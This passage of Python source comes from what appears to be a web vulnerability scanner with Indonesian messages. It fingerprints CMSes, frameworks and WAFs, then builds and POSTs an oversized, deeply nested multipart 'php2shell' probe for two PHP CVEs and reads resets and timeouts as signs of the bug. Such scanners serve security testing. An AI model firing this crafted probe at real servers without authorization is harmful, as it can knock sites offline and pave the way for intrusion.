            (b"/aura/", "medium"),
            (b"aura cms", "high"),
        ),
    },
    {
        "name": "PopojiCMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"/po-content/", "high"),
            (b"/po-admin/", "high"),
            (b"popojicms", "high"),
            (b"po-admin/route.php", "high"),
        ),
    },
    {
        "name": "FiyoCMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"fiyocms", "high"),
            (b"/fiyo/", "medium"),
            (b"fiyo cms", "high"),
        ),
    },
    {
        "name": "CMSID",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"cmsid", "medium"),
            (b"/cmsid/", "high"),
            (b"cms id", "low"),
        ),
    },
    {
        "name": "Balitbang",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"cmsbalitbang", "high"),
            (b"balitbang", "medium"),
            (b"/balitbang/", "high"),
        ),
    },
    {
        "name": "OpenSID",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"opensid", "high"),
            (b"theme/opensid", "high"),
            (b"open sid", "medium"),
        ),
    },
    {
        "name": "CiFireCMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"cifirecms", "high"),
            (b"cifire", "medium"),
            (b"/l-admin", "medium"),
        ),
    },
    {
        "name": "Swarakalibata",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"swarakalibata", "high"),
            (b"swara kalibata", "high"),
        ),
    },
    {
        "name": "SukaCMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"sukacms", "high"),
            (b"suka cms", "high"),
        ),
    },
    {
        "name": "GeniXCMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"genixcms", "high"),
            (b"genix", "medium"),
        ),
    },
    {
        "name": "Semar CMS",
        "php": True,
        "cookies": (),
        "headers": (),
        "body": (
            (b"semarcms", "high"),
            (b"semar cms", "high"),
        ),
    },
)


def _tech_record(
    details: Dict[str, dict],
    name: str,
    confidence: str,
    evidence: str,
    source: str,
    version: Optional[str] = None,
) -> None:
    record = details.get(name)
    if record is None:
        record = {
            "name": name,
            "confidence": confidence,
            "evidence": [],
            "sources": [],
        }
        details[name] = record
    if TECH_CONFIDENCE_RANK.get(confidence, 0) > TECH_CONFIDENCE_RANK.get(
        record["confidence"], 0
    ):
        record["confidence"] = confidence
    if evidence and evidence not in record["evidence"]:
        record["evidence"].append(evidence)
    if source and source not in record["sources"]:
        record["sources"].append(source)
    if version:
        record["version"] = version


def _cookie_names(header_value: str) -> set:
    return {
        match.group(1).lower()
        for match in COOKIE_NAME_PATTERN.finditer(header_value or "")
    }


def _record_codeigniter(
    details: Dict[str, dict],
    confidence: str,
    evidence: str,
    source: str,
) -> None:
    _tech_record(details, "CodeIgniter", confidence, evidence, source)
    _tech_record(details, "PHP", confidence, "CodeIgniter", "inferred")


def _fingerprint_cms_details(
    details: Dict[str, dict],
    header_map: Dict[str, str],
    body_lower: bytes,
    cookie_names: set,
) -> None:
    for signature in CMS_SIGNATURES:
        name = str(signature["name"])
        for prefix, confidence in signature["cookies"]:
            prefix_lower = prefix.lower()
            for cookie_name in cookie_names:
                if cookie_name.startswith(prefix_lower):
                    _tech_record(
                        details,
                        name,
                        confidence,
                        f"Set-Cookie: {cookie_name}",
                        "cookie",
                    )
        for header_name, marker, confidence in signature["headers"]:
            if header_name not in header_map:
                continue
            header_value = str(header_map.get(header_name, "")).lower()
            if marker and marker not in header_value:
                continue
            _tech_record(
                details,
                name,
                confidence,
                f"header: {header_name}",
                "header",
            )
        for marker, confidence in signature["body"]:
            if marker in body_lower:
                _tech_record(
                    details,
                    name,
                    confidence,
                    f"body: {marker.decode('ascii', 'replace')}",
                    "body",
                )
        if signature["php"] and name in details:
            _tech_record(
                details,
                "PHP",
                str(details[name]["confidence"]),
                name,
                "inferred",
            )


def fingerprint_tech_details(
    header_map: Dict[str, str],
    body: bytes,
    router_version: Optional[str] = None,
) -> List[dict]:
    details: Dict[str, dict] = {}
    body_lower = body.lower()
    server = header_map.get("server", "")
    server_lower = server.lower()
    powered_by = header_map.get("x-powered-by", "")
    powered_by_lower = powered_by.lower()
    cookie_header = header_map.get("set-cookie", "")
    cookie_names = _cookie_names(cookie_header)

    if "nginx" in server_lower or "openresty" in server_lower:
        match = NGINX_VERSION_PATTERN.search(server)
        version = ".".join(match.groups()) if match else None
        _tech_record(
            details,
            "NGINX",
            "high",
            f"Server: {server}",
            "header",
            version=version,
        )
    if b"nginx/" in body_lower or b"<center>nginx</center>" in body_lower:
        body_text = body.decode("utf-8", "replace")
        match = NGINX_VERSION_PATTERN.search(body_text)
        version = ".".join(match.groups()) if match else None
        _tech_record(
            details,
            "NGINX",
            "medium",
            "body memuat penanda NGINX",
            "body",
            version=version,
        )

    nextjs_headers = [
        name
        for name in (
            "x-nextjs-cache",
            "x-nextjs-request-id",
            "x-nextjs-html-request-id",
            "x-matched-path",
        )
        if name in header_map
    ]
    nextjs_body = [
        marker
        for marker in (
            b"__next_data__",
            b"/_next/static/",
            b"self.__next_f",
        )
        if marker in body_lower
    ]
    nextjs_from_powered_by = "next.js" in powered_by_lower
    if nextjs_from_powered_by:
        _tech_record(
            details,
            "Next.js",
            "high",
            f"X-Powered-By: {powered_by}",
            "header",
        )
    if nextjs_headers or nextjs_body or nextjs_from_powered_by:
        for name in nextjs_headers:
            _tech_record(
                details,
                "Next.js",
                "high",
                f"header: {name}",
                "header",
            )
        for marker in nextjs_body:
            _tech_record(
                details,
                "Next.js",
                "high",
                f"body: {marker.decode('ascii', 'replace')}",
                "body",
            )
        _tech_record(details, "React", "high", "Next.js", "inferred")
        _tech_record(
            details,
            "Node.js",
            "medium",
            "Next.js runtime",
            "inferred",
        )

    react_markers = (
        b"data-reactroot",
        b"react.production.min.js",
        b"react-dom",
        b"__react_devtools_global_hook__",
    )
    for marker in react_markers:
        if marker in body_lower:
            _tech_record(
                details,
                "React",
                "medium",
                f"body: {marker.decode('ascii', 'replace')}",
                "body",
            )
            break

    if "express" in powered_by_lower or "node" in powered_by_lower:
        _tech_record(
            details,
            "Node.js",
            "high",
            f"X-Powered-By: {powered_by}",
            "header",
        )
    if server_lower.strip() in ("node", "nodejs"):
        _tech_record(
            details,
            "Node.js",
            "high",
            f"Server: {server}",
            "header",
        )
    if b"node.js" in body_lower or b"nodejs" in body_lower:
        _tech_record(
            details,
            "Node.js",
            "medium",
            "body memuat penanda Node.js",
            "body",
        )

    if "php" in powered_by_lower:
        match = PHP_VERSION_PATTERN.search(powered_by)
        version = ".".join(match.groups()) if match else None
        _tech_record(
            details,
            "PHP",
            "high",
            f"X-Powered-By: {powered_by}",
            "header",
            version=version,
        )
    if "phpsessid" in cookie_names:
        _tech_record(
            details,
            "PHP",
            "medium",
            "Set-Cookie: PHPSESSID",
            "cookie",
        )
    if "ci_session" in cookie_names:
        _record_codeigniter(
            details,
            "high",
            "Set-Cookie: ci_session",
            "cookie",
        )
    if "csrf_cookie_name" in cookie_names:
        _record_codeigniter(
            details,
            "medium",
            "Set-Cookie: csrf_cookie_name",
            "cookie",
        )
    if (
        b'name="csrf_test_name"' in body_lower
        or b"name='csrf_test_name'" in body_lower
    ):
        _record_codeigniter(
            details,
            "medium",
            "body memuat csrf_test_name",
            "body",
        )
    if b"codeigniter" in body_lower:
        _record_codeigniter(
            details,
            "low",
            "body memuat penanda CodeIgniter",
            "body",
        )
    if b"/index.php/" in body_lower:
        _record_codeigniter(
            details,
            "low",
            "body: /index.php/",
            "body",
        )
    if b"<?php" in body_lower:
        _tech_record(
            details,
            "PHP",
            "low",
            "body memuat tag <?php",
            "body",
        )

    if router_version:
        _tech_record(
            details,
            "React Router",
            "high",
            f"versi {router_version}",
            "header/body",
            version=router_version,
        )
    elif any(marker in body_lower for marker in REACT_ROUTER_MARKERS):
        _tech_record(
            details,
            "React Router",
            "medium",
            "body memuat penanda React Router",
            "body",
        )

    _fingerprint_cms_details(details, header_map, body_lower, cookie_names)

    return list(details.values())


def fingerprint_tech_summary(
    details: List[dict], blocked: bool = False
) -> str:
    by_name = {
        str(detail.get("name")): detail
        for detail in details
        if detail.get("name")
    }
    parts = []
    for name in TECH_CRITICAL_NAMES:
        detail = by_name.get(name)
        if detail is None:
            label = "tidak terlihat"
        else:
            label = TECH_CONFIDENCE_LABEL.get(
                str(detail.get("confidence")), "terdeteksi"
            )
        parts.append(f"{name}={label}")
    for name in TECH_EXTRA_NAMES:
        detail = by_name.get(name)
        if detail is not None:
            label = TECH_CONFIDENCE_LABEL.get(
                str(detail.get("confidence")), "terdeteksi"
            )
            parts.append(f"{name}={label}")
    for name, detail in by_name.items():
        if name in TECH_CRITICAL_NAMES or name in TECH_EXTRA_NAMES:
            continue
        label = TECH_CONFIDENCE_LABEL.get(
            str(detail.get("confidence")), "terdeteksi"
        )
        parts.append(f"{name}={label}")
    if blocked:
        parts.append("baseline diblokir; hasil tidak lengkap")
    return "; ".join(parts)


def collect_fingerprint(
    host: str,
    timeout: int,
    verify_ssl: TLSVerify,
    custom_headers: Dict[str, str],
) -> dict:
    result = {
        "baseline_url": None,
        "status_code": None,
        "server": None,
        "powered_by": None,
        "tech": [],
        "tech_details": [],
        "tech_summary": None,
        "router_version": None,
        "waf": [],
        "challenge": False,
        "blocked": False,
        "headers": {},
        "reason": None,
        "error": None,
        "timestamp": utc_now(),
    }
    try:
        baseline_url = normalize_url(host, REACT_DEFAULT_PATH)
    except ValueError as exc:
        result["error"] = str(exc)
        result["reason"] = str(exc)
        return result

    result["baseline_url"] = baseline_url
    headers: Dict[str, str] = dict(BROWSER_DEFAULT_HEADERS)
    for name, value in custom_headers.items():
        if name.lower() != "proxy-authorization":
            set_header(headers, name, value)
    if not has_header(headers, "User-Agent"):
        headers["User-Agent"] = FINGERPRINT_USER_AGENT

    response: Optional[requests.Response] = None
    body = b""
    error: Optional[str] = None
    attempts = max(0, RUNTIME.retries) + 1

    for attempt in range(attempts):
        response = None
        body = b""
        error = None
        RUNTIME.wait()
        try:
            response = requests.get(
                baseline_url,
                headers=headers,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                stream=True,
                proxies=request_proxies(),
            )
            for chunk in response.iter_content(1024):
                body += chunk
                if len(body) >= FINGERPRINT_BODY_LIMIT:
                    break
        except requests.exceptions.SSLError as exc:
            error = tls_error_message(exc)
        except requests.exceptions.ConnectionError as exc:
            error = f"kesalahan koneksi: {exc}"
        except requests.exceptions.Timeout:
            error = REACT_TIMEOUT_MESSAGE
        except RequestException as exc:
            error = f"permintaan gagal: {exc}"
        except Exception as exc:
            error = f"kesalahan tak terduga: {exc}"

        if response is not None:
            header_map = {
                name.lower(): value for name, value in response.headers.items()
            }
            retry_status = response.status_code in RETRYABLE_HTTP_STATUSES
            if (
                retry_status
                and attempt + 1 < attempts
            ):
                retry_after = retry_after_seconds(
                    {name: value for name, value in response.headers.items()}
                )
                response.close()
                RUNTIME.backoff(attempt, retry_after)
                continue

            body_lower = body.lower()
            header_blob = " ".join(
                f"{name}: {value}"
                for name, value in response.headers.items()
            ).lower()
            waf = [
                name
                for name, signatures in WAF_SIGNATURES.items()
                if any(signature in header_blob for signature in signatures)
            ]
            body_waf = []
            if response.status_code in CHALLENGE_STATUSES:
                body_waf = [
                    name
                    for name, signatures in WAF_BODY_SIGNATURES.items()
                    if any(
                        signature in body_lower
                        for signature in signatures
                    )
                ]
            waf = list(dict.fromkeys(waf + body_waf))
            strong_challenge_marker = any(
                marker in body_lower for marker in STRONG_CHALLENGE_MARKERS
            )
            weak_challenge_marker = any(
                marker in body_lower for marker in WEAK_CHALLENGE_MARKERS
            )
            challenge = (
                strong_challenge_marker
                and (
                    bool(waf)
                    or response.status_code in CHALLENGE_STATUSES
                )
            ) or (
                weak_challenge_marker
                and (
                    bool(waf)
                    or response.status_code in WEAK_CHALLENGE_STATUSES
                )
            )
            blocked = (
                challenge
                or response.status_code == 429
                or (
                    bool(waf)
                    and response.status_code in (401, 403, 406, 503)
                )
            )
            tech = []
            server_value = header_map.get("server", "").lower()
            if "nginx" in server_value or "openresty" in server_value:
                tech.append("NGINX")
            if (
                any(
                    name in header_map
                    for name in (
                        "x-nextjs-cache",
                        "x-nextjs-request-id",
                        "x-nextjs-html-request-id",
                        "x-matched-path",
                    )
                )
                or b"__next_data__" in body_lower
                or b"/_next/static/" in body_lower
                or b"self.__next_f" in body_lower
            ):
                tech.append("Next.js")
            if "x-powered-by" in header_map:
                tech.append(header_map["x-powered-by"])
            cookie_header = header_map.get("set-cookie", "").lower()
            if "phpsessid" in cookie_header:
                tech.append("PHP")
            body_text = body.decode("utf-8", "replace")
            router_version = react_router_extract_version(
                body_text, header_map
            )
            if router_version or any(
                marker in body_lower for marker in REACT_ROUTER_MARKERS
            ):
                tech.append("React Router")
            tech_details = fingerprint_tech_details(
                header_map, body, router_version
            )
            for detail in tech_details:
                name = str(detail.get("name"))
                if name and name not in tech:
                    tech.append(name)
            tech = list(dict.fromkeys(tech))

            if error:
                result["error"] = error
            result["status_code"] = response.status_code
            result["server"] = header_map.get("server")
            result["powered_by"] = header_map.get("x-powered-by")
            result["tech"] = tech
            result["tech_details"] = tech_details
            result["tech_summary"] = fingerprint_tech_summary(
                tech_details, blocked=blocked
            )
            result["router_version"] = router_version
            result["waf"] = waf
            result["challenge"] = challenge
            result["blocked"] = blocked
            result["headers"] = {
                name: value
                for name, value in response.headers.items()
                if name.lower() in FINGERPRINT_HEADERS
            }
            if blocked:
                label = ", ".join(waf) if waf else "challenge keamanan"
                result["reason"] = (
                    f"baseline mendeteksi {label} "
                    f"(HTTP {response.status_code})"
                )
            elif waf:
                result["reason"] = "WAF/CDN terdeteksi: " + ", ".join(waf)
            elif response.status_code in (401, 403, 406):
                result["reason"] = (
                    f"baseline menerima HTTP {response.status_code} tanpa "
                    "indikasi WAF/challenge (kemungkinan akses ditolak aplikasi)"
                )
            else:
                result["reason"] = "baseline tidak menunjukkan blokir WAF"
            response.close()
            return result

        if error and attempt + 1 < attempts and is_retryable_error(error):
            RUNTIME.backoff(attempt)
            continue
        break

    if response is not None:
        response.close()
    result["error"] = error or "baseline gagal"
    result["reason"] = f"baseline gagal: {result['error']}"
    return result


# ---------------------------------------------------------------------------
# Engine PHP: CVE-2026-109618 / CVE-2026-109619
# ---------------------------------------------------------------------------


@dataclass
class PhpHTTPResult:
    status_code: Optional[int] = None
    reason: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: bytes = b""
    bytes_sent: int = 0
    error: Optional[str] = None

    @property
    def powered_by(self) -> str:
        for name, value in self.headers.items():
            if name.lower() == "x-powered-by":
                return value
        return ""


@lru_cache(maxsize=len(PHP_PROBES))
def php_build_probe_body(size_mib: int, parts: int) -> bytes:
    size = size_mib << 20
    name = b"a[]" + (b"[a]" * PHP_NESTED_KEYS)
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(
            f"probe php2shell {size} byte tidak cukup untuk {parts} bagian "
            f"({len(base)} byte)"
        )
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


@lru_cache(maxsize=len(PHP_PROBES))
def php_build_valid_control_body(size_bytes: int) -> bytes:
    boundary = PHP_CONTROL_BOUNDARY.encode("ascii")
    header = (
        b"--"
        + boundary
        + b"\r\n"
        b'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
    )
    footer = b"\r\n--" + boundary + b"--\r\n"
    if size_bytes < len(header) + len(footer):
        raise ValueError(
            f"kontrol valid multipart {size_bytes} byte tidak cukup untuk "
            "header/footer"
        )
    return header + b"A" * (size_bytes - len(header) - len(footer)) + footer


def php_transport_error_is_timeout(error: Optional[str]) -> bool:
    return bool(error and "timeout" in error.lower())


def php_transport_error_is_reset(error: Optional[str]) -> bool:
    if not error:
        return False
    normalized = error.lower()
    return any(marker in normalized for marker in PHP_CONNECTION_RESET_MARKERS)


def php_response_alive(response: Optional[PhpHTTPResult]) -> bool:
    return (
        response is not None
        and response.error is None
        and response.status_code is not None
        and 200 <= response.status_code < 300
    )


def php_response_ok_with_body(response: Optional[PhpHTTPResult]) -> bool:
    return php_response_alive(response) and bool(response.body)


def php_probe_needs_differential(probe: PhpHTTPResult, sapi: str) -> bool:
    if probe.error:
        return php_transport_error_is_reset(probe.error)
    if probe.status_code in (200, 500) and not probe.body:
        return True
    if probe.status_code in (502, 503, 504) and sapi != "mod_php":
        return True
    return False


def php_sapi_mode(sapi: str) -> str:
    if sapi == "fpm":
        return "PHP-FPM"
    if sapi == "mod_php":
        return "mod_php"
    return "mod_php/PHP-FPM"


def php_request_headers(
    custom_headers: Dict[str, str], boundary: str
) -> Dict[str, str]:
    headers = dict(custom_headers)
    for name in (
        "Content-Length",
        "Transfer-Encoding",
        "Proxy-Authorization",
    ):
        for key in list(headers):
            if key.lower() == name.lower():
                del headers[key]
    if not has_header(headers, "User-Agent"):
        headers["User-Agent"] = PHP_DEFAULT_USER_AGENT
    set_header(headers, "Content-Type", f"multipart/form-data; boundary={boundary}")
    set_header(headers, "Connection", "close")
    if not has_header(headers, "Accept-Encoding"):
        headers["Accept-Encoding"] = "gzip"
    return headers


class PhpHTTPTransportError(Exception):
    pass


@dataclass
class PhpConnectionEnd:
    error: Optional[Exception]


class PhpDuplexHTTPProtocol(asyncio.Protocol):
    def __init__(self) -> None:
        self.transport: Optional[asyncio.Transport] = None
        self.incoming = asyncio.Queue()
        self.writable = asyncio.Event()
        self.writable.set()
        self.buffered_bytes = 0
        self.reading_paused = False
        self.ended = False
        self.end_error: Optional[Exception] = None

    def connection_made(self, transport: asyncio.BaseTransport) -> None:
        self.transport = transport  # type: ignore[assignment]
        transport.set_write_buffer_limits(  # type: ignore[attr-defined]
            high=PHP_WRITE_BUFFER_HIGH_WATER,
            low=PHP_WRITE_BUFFER_LOW_WATER,
        )

    def data_received(self, data: bytes) -> None:
        if not data:
            return
        self.buffered_bytes += len(data)
        self.incoming.put_nowait(data)
        if (
            self.buffered_bytes >= PHP_READ_BUFFER_HIGH_WATER
            and not self.reading_paused
            and self.transport is not None
        ):
            self.transport.pause_reading()  # type: ignore[attr-defined]
            self.reading_paused = True

    def eof_received(self) -> Optional[bool]:
        self.finish(None)
        return False

    def connection_lost(self, exc: Optional[Exception]) -> None:
        self.finish(exc)

    def pause_writing(self) -> None:
        self.writable.clear()

    def resume_writing(self) -> None:
        self.writable.set()

    def finish(self, error: Optional[Exception]) -> None:
        if self.ended:
            return
        self.ended = True
        self.end_error = error
        self.writable.set()
        self.incoming.put_nowait(PhpConnectionEnd(error))

    async def write(self, data: bytes) -> None:
        await self.writable.wait()
        if self.ended or self.transport is None:
            raise self.end_error or BrokenPipeError(
                "koneksi tertutup saat mengunggah data"
            )
        self.transport.write(data)  # type: ignore[attr-defined]
        await asyncio.sleep(0)

    async def read(self) -> bytes:
        item = await self.incoming.get()
        if isinstance(item, PhpConnectionEnd):
            if item.error is not None:
                raise item.error
            return b""

        self.buffered_bytes -= len(item)
        if (
            self.reading_paused
            and self.buffered_bytes <= PHP_READ_BUFFER_LOW_WATER
            and self.transport is not None
            and not self.ended
        ):
            self.transport.resume_reading()  # type: ignore[attr-defined]
            self.reading_paused = False
        return item

    def abort(self) -> None:
        if self.transport is not None:
            self.transport.abort()


async def php_proxy_connect(
    protocol: "PhpDuplexHTTPProtocol",
    proxy: ProxyConfig,
    hostname: str,
    port: int,
    timeout: int,
) -> None:
    authority = (
        f"[{hostname}]:{port}" if ":" in hostname else f"{hostname}:{port}"
    )
    lines = [
        f"CONNECT {authority} HTTP/1.1",
        f"Host: {authority}",
        "Proxy-Connection: keep-alive",
    ]
    if proxy.authorization:
        lines.append(f"Proxy-Authorization: {proxy.authorization}")
    payload = ("\r\n".join(lines) + "\r\n\r\n").encode("ascii")
    await protocol.write(payload)

    buffer = b""
    while True:
        while b"\r\n\r\n" not in buffer:
            chunk = await asyncio.wait_for(protocol.read(), timeout=timeout)
            if not chunk:
                raise PhpHTTPTransportError(
                    "proxy menutup koneksi sebelum CONNECT selesai"
                )
            buffer += chunk
            if len(buffer) > PHP_MAX_RESPONSE_HEADER_BYTES:
                raise PhpHTTPTransportError("respons CONNECT proxy terlalu besar")

        header, _, remainder = buffer.partition(b"\r\n\r\n")
        status_line = header.split(b"\r\n", 1)[0]
        parts = status_line.split(b" ", 2)
        if len(parts) < 2 or not parts[1].isdigit():
            raise PhpHTTPTransportError("respons CONNECT proxy tidak valid")
        status_code = int(parts[1])
        if 100 <= status_code < 200:
            if status_code == 101:
                raise PhpHTTPTransportError(
                    "upgrade protokol pada CONNECT proxy tidak didukung"
                )
            buffer = remainder
            continue
        if not 200 <= status_code < 300:
            raise PhpHTTPTransportError(
                f"proxy menolak CONNECT dengan HTTP {status_code}"
            )
        if remainder:
            raise PhpHTTPTransportError(
                "proxy mengirim data tak terduga setelah CONNECT"
            )
        return


def php_request_target(parsed: SplitResult) -> bytes:
    path = quote(
        parsed.path or "/",
        safe="/%:@!$&'()*+,;=-._~",
        encoding="utf-8",
        errors="strict",
    )
    if parsed.query:
        path += "?" + quote(
            parsed.query,
            safe="/?%:@!$&'()*+,;=-._~",
            encoding="utf-8",
            errors="strict",
        )
    return path.encode("ascii")


def php_host_header(parsed: SplitResult) -> str:
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError("URL target tidak memiliki hostname")
    hostname = hostname.encode("idna").decode("ascii")
    if ":" in hostname:
        hostname = f"[{hostname}]"
    if parsed.port is not None:
        hostname += f":{parsed.port}"
    return hostname


def php_absolute_request_target(parsed: SplitResult) -> bytes:
    path = php_request_target(parsed).decode("ascii")
    return (
        f"{parsed.scheme}://{php_host_header(parsed)}{path}".encode("ascii")
    )


def php_ssl_context(verify_ssl: TLSVerify) -> ssl.SSLContext:
    if isinstance(verify_ssl, str):
        context = ssl.create_default_context(cafile=verify_ssl)
    else:
        context = ssl.create_default_context()
    context.set_alpn_protocols(["http/1.1"])
    if verify_ssl is False:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context


def php_wire_headers(
    parsed: SplitResult, headers: Dict[str, str], body_size: int
) -> List[Tuple[bytes, bytes]]:
    supplied_host = header_value(headers, "Host")
    host = supplied_host or php_host_header(parsed)
    encoded: List[Tuple[bytes, bytes]] = [(b"Host", host.encode("latin-1"))]
    for name, value in headers.items():
        if name.lower() == "host":
            continue
        encoded.append((name.encode("ascii"), value.encode("latin-1")))
    encoded.append((b"Content-Length", str(body_size).encode("ascii")))
    return encoded


def php_response_headers(raw_headers: List[Tuple[bytes, bytes]]) -> Dict[str, str]:
    headers: Dict[str, str] = {}
    original_names: Dict[str, str] = {}
    for raw_name, raw_value in raw_headers:
        name = raw_name.decode("ascii")
        value = raw_value.decode("latin-1")
        lowered = name.lower()
        if lowered in original_names:
            original = original_names[lowered]
            headers[original] += ", " + value
        else:
            original_names[lowered] = name
            headers[name] = value
    return headers


async def php_upload_body(
    connection: h11.Connection,
    protocol: PhpDuplexHTTPProtocol,
    body: bytes,
) -> None:
    for offset in range(0, len(body), PHP_UPLOAD_CHUNK_SIZE):
        data = connection.send(
            h11.Data(data=body[offset : offset + PHP_UPLOAD_CHUNK_SIZE])
        )
        if data:
            await protocol.write(data)
    data = connection.send(h11.EndOfMessage())
    if data:
        await protocol.write(data)


async def php_decode_gzip_data(decoder, data: bytes, body: bytearray):
    pending = data
    if decoder.eof and pending:
        decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)

    while pending:
        if len(body) >= PHP_BODY_READ_LIMIT:
            return decoder
        try:
            decoded = decoder.decompress(pending, PHP_UPLOAD_CHUNK_SIZE)
        except zlib.error as exc:
            raise PhpHTTPTransportError(f"respons gzip tidak valid: {exc}") from exc

        remaining = PHP_BODY_READ_LIMIT - len(body)
        if remaining > 0:
            body.extend(decoded[:remaining])

        if decoder.eof:
            pending = decoder.unused_data
            if pending:
                decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
        else:
            pending = decoder.unconsumed_tail

        if pending:
            await asyncio.sleep(0)
    return decoder


async def php_read_response(
    connection: h11.Connection, protocol: PhpDuplexHTTPProtocol
) -> PhpHTTPResult:
    status_code: Optional[int] = None
    reason = ""
    headers: Dict[str, str] = {}
    body = bytearray()
    decoder = None

    while True:
        event = connection.next_event()
        if event is h11.NEED_DATA:
            data = await protocol.read()
            connection.receive_data(data)
            continue
        if event is h11.PAUSED:
            raise PhpHTTPTransportError("respons HTTP tambahan tidak terduga")
        if isinstance(event, h11.InformationalResponse):
            if event.status_code == 101:
                raise PhpHTTPTransportError(
                    "upgrade protokol HTTP tidak didukung"
                )
            continue
        if isinstance(event, h11.Response):
            status_code = event.status_code
            reason = event.reason.decode("latin-1")
            headers = php_response_headers(list(event.headers))
            content_encoding = header_value(headers, "Content-Encoding").strip().lower()
            if content_encoding == "gzip":
                if status_code not in (204, 304):
                    decoder = zlib.decompressobj(16 + zlib.MAX_WBITS)
                remove_header(headers, "Content-Encoding")
                remove_header(headers, "Content-Length")
            elif content_encoding not in ("", "identity"):
                raise PhpHTTPTransportError(
                    f"encoding konten tidak didukung: {content_encoding}"
                )
            continue
        if isinstance(event, h11.Data):
            if status_code is None:
                raise PhpHTTPTransportError(
                    "body respons diterima sebelum header respons"
                )
            remaining = PHP_BODY_READ_LIMIT - len(body)
            if decoder is not None:
                decoder = await php_decode_gzip_data(decoder, event.data, body)
            elif remaining > 0:
                body.extend(event.data[:remaining])
            continue
        if isinstance(event, h11.EndOfMessage):
            if status_code is None:
                raise PhpHTTPTransportError(
                    "respons berakhir sebelum header respons"
                )
            if decoder is not None and len(body) < PHP_BODY_READ_LIMIT:
                try:
                    tail = decoder.flush(PHP_BODY_READ_LIMIT - len(body))
                except zlib.error as exc:
                    raise PhpHTTPTransportError(
                        f"respons gzip tidak valid: {exc}"
                    ) from exc
                remaining = PHP_BODY_READ_LIMIT - len(body)
                body.extend(tail[:remaining])
                if not decoder.eof:
                    raise PhpHTTPTransportError("respons gzip terpotong")
            return PhpHTTPResult(status_code, reason, headers, bytes(body))
        if isinstance(event, h11.ConnectionClosed):
            raise PhpHTTPTransportError(
                "koneksi tertutup sebelum respons selesai"
            )


async def php_exchange_post(
    target_url: str,
    body: bytes,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
) -> PhpHTTPResult:
    parsed = urlsplit(target_url)
    hostname = parsed.hostname
    if hostname is None:
        raise ValueError("URL target tidak memiliki hostname")
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    try:
        authority_host = hostname.encode("idna").decode("ascii")
    except UnicodeError:
        authority_host = hostname

    proxy = RUNTIME.proxy
    if (
        proxy is not None
        and proxy.scheme == "https"
        and parsed.scheme == "https"
        and sys.version_info < (3, 11)
    ):
        raise PhpHTTPTransportError(
            "proxy HTTPS ke target HTTPS memerlukan Python 3.11 atau lebih baru"
        )
    target_ssl_context = (
        php_ssl_context(verify_ssl) if parsed.scheme == "https" else None
    )

    connect_ssl_context: Optional[ssl.SSLContext] = None
    connect_server_hostname: Optional[str] = None
    if proxy is not None:
        connect_host = proxy.host
        connect_port = proxy.port
        if proxy.scheme == "https":
            connect_ssl_context = php_ssl_context(verify_ssl)
            connect_server_hostname = proxy.host
    else:
        connect_host = hostname
        connect_port = port
        if target_ssl_context is not None:
            connect_ssl_context = target_ssl_context
            connect_server_hostname = hostname

    open_kwargs = {}
    if connect_ssl_context is not None:
        open_kwargs = {
            "ssl": connect_ssl_context,
            "server_hostname": connect_server_hostname,
            "ssl_handshake_timeout": min(PHP_CONNECT_TIMEOUT, timeout),
        }

    loop = asyncio.get_running_loop()
    transport, base_protocol = await asyncio.wait_for(
        loop.create_connection(
            PhpDuplexHTTPProtocol,
            host=connect_host,
            port=connect_port,
            happy_eyeballs_delay=0.25,
            **open_kwargs,
        ),
        timeout=min(PHP_CONNECT_TIMEOUT, timeout),
    )
    protocol = base_protocol
    if not isinstance(protocol, PhpDuplexHTTPProtocol):
        transport.abort()
        raise PhpHTTPTransportError("gagal menginisialisasi transport HTTP")

    upload_task: Optional[asyncio.Task] = None
    try:
        request_headers = headers
        request_target = php_request_target(parsed)
        if proxy is not None:
            if parsed.scheme == "https":
                await php_proxy_connect(
                    protocol,
                    proxy,
                    authority_host,
                    port,
                    timeout,
                )
                if target_ssl_context is None or protocol.transport is None:
                    raise PhpHTTPTransportError(
                        "transport TLS target tidak tersedia"
                    )
                new_transport = await asyncio.wait_for(
                    loop.start_tls(
                        protocol.transport,
                        protocol,
                        target_ssl_context,
                        server_hostname=hostname,
                        ssl_handshake_timeout=min(
                            PHP_CONNECT_TIMEOUT, timeout
                        ),
                    ),
                    timeout=min(PHP_CONNECT_TIMEOUT, timeout),
                )
                protocol.transport = new_transport  # type: ignore[assignment]
            else:
                request_target = php_absolute_request_target(parsed)
                if proxy.authorization:
                    request_headers = dict(headers)
                    set_header(
                        request_headers,
                        "Proxy-Authorization",
                        proxy.authorization,
                    )

        connection = h11.Connection(
            h11.CLIENT, max_incomplete_event_size=PHP_MAX_RESPONSE_HEADER_BYTES
        )
        request = h11.Request(
            method=b"POST",
            target=request_target,
            headers=php_wire_headers(parsed, request_headers, len(body)),
        )
        data = connection.send(request)
        if data:
            await protocol.write(data)

        upload_task = asyncio.create_task(
            php_upload_body(connection, protocol, body)
        )
        response = await php_read_response(connection, protocol)
        return response
    finally:
        if upload_task is not None:
            if not upload_task.done():
                upload_task.cancel()
            await asyncio.gather(upload_task, return_exceptions=True)
        protocol.abort()


async def php_timed_exchange_post(
    target_url: str,
    body: bytes,
    headers: Dict[str, str],
    timeout: int,
    verify_ssl: TLSVerify,
